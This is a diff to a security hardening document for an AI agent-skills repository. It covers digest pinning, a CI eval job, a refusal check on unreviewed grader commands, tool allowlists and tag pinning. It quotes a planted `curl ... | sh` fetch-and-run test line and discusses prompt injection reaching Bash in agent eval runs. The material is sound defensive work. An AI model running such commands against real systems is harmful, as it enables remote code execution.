@@ -100,7 +100,7 @@ is not a hash.
 **Where it fails open.** A digest goes stale and the next person bumps it to a tag for
 convenience. Dependabot does not watch a container reference inside a Markdown code block.
 
-**Landed.** `skills/github/github-actions-security/SKILL.md:241`-`:243` and `README.md:577` now
+**Landed.** `skills/github/github-actions-security/SKILL.md:241`-`:243` and `README.md:593` now
 carry `rhysd/actionlint@sha256:b1934ee5...`, the digest from `lint.yml:173`. The prose at
 `github-actions-security/SKILL.md:228`-`:232` was rewritten to state the reason where the
 command is, rather than as a rule the
@@ -109,7 +109,7 @@ command beneath it broke.
 ### 3. Run `check_evals.py` in CI
 
 `scripts/check_evals.py` is 571 lines of structural checks on the eval suites, and `lint.yml` has
-no job for it. `README.md:567` documents it as something to type.
+no job for it. `README.md:583` documents it as something to type.
 
 **What it stops.** Nothing on its own. It is listed this high purely on ratio: four lines of YAML
 put a machine between a contributor's `assertions.json` and a human's assumption that someone
@@ -122,7 +122,8 @@ fields; it does not care what the command does.
 count this as a control against 1.1. Count it as the place a check against 1.1 would go.
 
 **Landed.** A fifth job, `evals`, at `.github/workflows/lint.yml:112`-`:147`, running
-`python3 scripts/check_evals.py`, conditionally with `--strict` (`:138`-`:147`). Three choices in
+`python3 scripts/check_evals.py`, with `--strict-suite` for each suite the diff touches
+(`:138`-`:147`). Three choices in
 it:
 
 - **No uv setup.** The script imports only the standard library and shells out to `git` and
@@ -132,17 +133,19 @@ it:
   failed git lookup to an empty string, which reads as "nothing changed". A shallow checkout
   would report every suite fresh without having compared anything, which is worse than not
   running it.
-- **`--strict` only when the diff itself is what went stale** (`:142`-`:144`). Staleness is a
-  statement about when a measurement was last taken, and a pull request that does not touch a
-  skill cannot fix it, so an unconditional `--strict` would fail every pull request for a reason
-  none of them caused. A change under `skills/`, or to an eval's own `tasks.json` or
-  `assertions.json`, is the one case where the contributor causing the staleness can also resolve
-  it before merge, so that diff shape runs `--strict`; everything else runs the structural-only
-  form, which is what blocks regardless.
+- **Strict only for the suites the diff touches** (`:141`-`:147`). Staleness is a statement
+  about when a measurement was last taken, and a pull request that does not touch a suite
+  cannot fix it, so an unconditional `--strict` would fail every pull request for a reason none
+  of them caused. A change to an eval's own `tasks.json` or `assertions.json` is the case where
+  the contributor causing the staleness can also resolve it before merge, so each such suite is
+  passed as `--strict-suite` and its unmeasured and staleness findings fail. The findings on
+  every other suite are reported and do not fail, and the structural checks block regardless.
+  An earlier form ran the all-suite `--strict` on that diff shape, which failed any pull
+  request that touched a suite on findings it could not resolve.
 
 `actionlint` and `zizmor` were run against the changed workflow, as
 `skills/github/github-actions-security/SKILL.md` requires of any workflow change, and both are
-clean. `README.md:560` was updated from four jobs to five.
+clean. `README.md:576` was updated from four jobs to five.
 
 This still stops nothing on its own, exactly as stated above. What it buys is that the slot now
 exists: a check that reads what a grader command actually does has somewhere to live, and control
@@ -150,8 +153,8 @@ exists: a check that reads what a grader command actually does has somewhere to 
 
 ### 4. Stop running graders from an unreviewed ref
 
-`evals/run_eval.py:864` executes a string from `assertions.json` with `shell=True`. The comment at
-`:862` justifies it by saying the command comes from a checked-in file in this repository, which is
+`evals/run_eval.py:882` executes a string from `assertions.json` with `shell=True`. The comment at
+`:880` justifies it by saying the command comes from a checked-in file in this repository, which is
 true of `main` and false of a pull request branch.
 
 Three options, in descending order of what they actually buy:
@@ -176,26 +179,27 @@ runs under `bypassPermissions`.
 is not a hypothetical: the whole reason to run an eval on a contributor branch is to see whether
 the contribution works.
 
-**Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:794` runs before
-anything is graded, called from `cmd_tasks` (`:1492`), `cmd_agent_tasks` (`:1545`) and
-`cmd_regrade` (`:1737`), which are the only three subcommands that execute an assertion command.
+**Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:812` runs before
+anything is graded, called from `cmd_tasks` (`:1751`), `cmd_agent_tasks` (`:1804`),
+`cmd_instructions_tasks` (`:1852`) and `cmd_regrade` (`:2073`), which are the only four subcommands
+that execute an assertion command.
 Four decisions in it are worth stating, because each one is a place the control could have been
 weaker:
 
-- **The baseline is `origin/main`, falling back to `main`** (`:701`). Preferring the remote means
+- **The baseline is `origin/main`, falling back to `main`** (`:719`). Preferring the remote means
   a stale local branch cannot make an unreviewed change look reviewed.
-- **The guarded set is the suite's `assertions.json` and `run_eval.py` itself** (`:706`). The
+- **The guarded set is the suite's `assertions.json` and `run_eval.py` itself** (`:724`). The
   second is not optional: the harness decides whether, where and as what a grader string runs, so
   editing it is editing what a contributor can make the machine do.
-- **The comparison is against the working tree, not `HEAD`** (`:761`). A contributor's change
+- **The comparison is against the working tree, not `HEAD`** (`:779`). A contributor's change
   arrives committed on a branch or applied as a patch, and both produce the same shell command.
-- **The refusal prints the `workspace_command` strings that are new or changed** (`:725`, `:739`),
+- **The refusal prints the `workspace_command` strings that are new or changed** (`:743`, `:757`),
   and only those: the regex assertion kinds are matched in-process and execute nothing. The point
   of the flag is that a human has read the commands, so the commands are put in front of them.
 
 Verified by planting `curl -s https://example.invalid/x | sh` into a suite's `assertions.json`:
 the run refused, named the file, and printed that command. The planted assertion was reverted.
-`--graders-reviewed` (`:2312`) is the waiver, and taking it is logged to stdout rather than
+`--graders-reviewed` (`:2787`) is the waiver, and taking it is logged to stdout rather than
 passing silently.
 
 **What it does not buy.** A reviewed command runs with exactly the reach it had before. This
@@ -215,7 +219,7 @@ was the default. The proposal here was to swap them, so that bypass required an 
 "the tools the run was given".
 
 **What it does not stop.** A run that legitimately needs Bash still gets Bash, and a fixture-borne
-injection then gets Bash. It also does not touch the credentials symlink at `:329`, which is a
+injection then gets Bash. It also does not touch the credentials symlink at `:346`, which is a
 separate decision: a dedicated eval credential, rotated, would be worth more than the permission
 flag.
 
@@ -227,10 +231,10 @@ implementation: `claude -p` cannot answer a permission prompt, so a task run wit
 mode has every Bash and Edit call denied, and a denied call is recorded identically to a skill that
 chose not to act. Removing the mode would not have bounded the run, it would have destroyed the
 measurement. The permission mode cannot be the control for a task run. The tool list can, so that
-is what shipped: `TASK_TOOLS` at `run_eval.py:116` allows Bash, the file tools and `Skill`, and
-`RunPermissions` at `:350` carries the tool list and the mode together so that widening the surface
-and suppressing prompts are two decisions rather than one `if/else` (`:396`-`:401`). `--all-tools`
-(`:1524`, `:2334`) restores the audited command line. The allowlist is derived from what the
+is what shipped: `TASK_TOOLS` at `run_eval.py:122` allows Bash, the file tools and `Skill`, and
+`RunPermissions` at `:367` carries the tool list and the mode together so that widening the surface
+and suppressing prompts are two decisions rather than one `if/else` (`:413`-`:418`). `--all-tools`
+(`:1783`, `:2809`) restores the audited command line. The allowlist is derived from what the
 committed transcripts show tasks actually use, and it excludes what they show runs reaching but no
 task asks for: `WebFetch` thirty times on the 2026-07-28 `github-actions-security` stamp, plus one
 `ToolSearch` and one `ScheduleWakeup`. Two caveats. Those three `github-actions-security` tasks
@@ -264,11 +268,11 @@ while only one of them is fixed.
 
 **Landed on the repository side.** Four changes, none of which needs a remote action:
 
-- **The documented install is pinned first.** `README.md:255` gives
+- **The documented install is pinned first.** `README.md:256` gives
   `/plugin marketplace add konstruktoid/agent-instructions-skills@v0.3.0`, and the unpinned form
-  is kept below it at `:265`, labeled as tracking the default branch. This is the half of the
+  is kept below it at `:266`, labeled as tracking the default branch. This is the half of the
   control that decides what people paste.
-- **The team setting names a tag.** `README.md:318` gives `"ref": "v0.3.0"` and states why branch
+- **The team setting names a tag.** `README.md:319` gives `"ref": "v0.3.0"` and states why branch
   and tag are not equivalent: a tag here is protected against deletion and force update, and a
   branch is a moving reference the next push changes.
 - **Every plugin entry declares the same `version`.** `.claude-plugin/marketplace.json` carries
@@ -281,7 +285,7 @@ while only one of them is fixed.
   the `creation` rule from `:147` deliberately: with one account and no bypass actors, that rule
   would block the owner from cutting a tag at all, and restricting creation to the publishing role
   adds nothing in a repository where one account already holds the only write access.
-  `README.md:708` documents the release order and the `gh api` call that applies the ruleset.
+  `README.md:727` documents the release order and the `gh api` call that applies the ruleset.
 
 **Landed, 2026-08-30.** The tag `v0.1.0` is pushed and released, so the pinned install the
 README documents resolves, and the ruleset was applied from the file with `gh api --method POST
@@ -584,7 +588,7 @@ Collected, so the answers are in one place.
 | Declared-capability frontmatter plus CI | Worth doing at low ambition. Makes a capability change reviewable rather than impossible, and only for capabilities written as recognizable command text. Addresses actor 1 modestly, actors 2 and 3 not at all |
 | Capability-diff release notes | Worth doing after tags and declarations exist. Makes a change reviewable rather than impossible, aimed at actor 4. Generate them from the diff or do not ship them |
 | SLSA provenance and a source-track claim | Authenticity, not safety. Addresses none of actors 1, 2 or 3. Addresses one narrow actor-4 case, substitution of the source itself. The source-track claim requires review this repository's single-owner `CODEOWNERS` cannot provide, so it must not be claimed |
-| Consumer pinning guidance | The highest-value item in this group. `README.md:255` now leads with the pinned form and `README.md:318` names a tag in the team setting, the tag it names is pushed once `v0.3.0` is cut, and the tag ruleset is applied, so the pinned reference is immutable. What remains is the consumer who installs the unpinned form, which still tracks the default branch |
+| Consumer pinning guidance | The highest-value item in this group. `README.md:256` now leads with the pinned form and `README.md:319` names a tag in the team setting, the tag it names is pushed once `v0.3.0` is cut, and the tag ruleset is applied, so the pinned reference is immutable. What remains is the consumer who installs the unpinned form, which still tracks the default branch |
 
 ## Recommended order of implementation
 
@@ -592,7 +596,7 @@ Steps 1 to 9 are done and committed, and the two remote actions step 6 names are
 is where the work resumes, and it needs the tag from step 6, which exists as `v0.1.0`.
 
 1. **Control 2**, pin the actionlint container by digest. **Landed:**
-   `skills/github/github-actions-security/SKILL.md:241`-`:243` and `README.md:577` carry the
+   `skills/github/github-actions-security/SKILL.md:241`-`:243` and `README.md:593` carry the
    digest from `lint.yml:173`.
 2. **Control 1**, allowlist the repository root. **Landed:** `check_plugin_root` at
    `scripts/check_skills.py:717`. Attack path 1.3 is closed.
@@ -600,7 +604,7 @@ is where the work resumes, and it needs the tag from step 6, which exists as `v0
    than a permission-mode change, for the reason in that control's note. Attack path 1.2 is
    narrowed, not closed.
 4. **Control 4**, stop running graders from an unreviewed ref. **Landed** as the refusal check at
-   `evals/run_eval.py:794`. The sandbox half is deliberately not done: the refusal decides who
+   `evals/run_eval.py:812`. The sandbox half is deliberately not done: the refusal decides who
    chose a grader command, and only the sandbox bounds what one can reach. Attack path 1.1 is
    gated, not closed.
 5. **Control 3**, run `check_evals.py` in CI. **Landed** as the `evals` job at
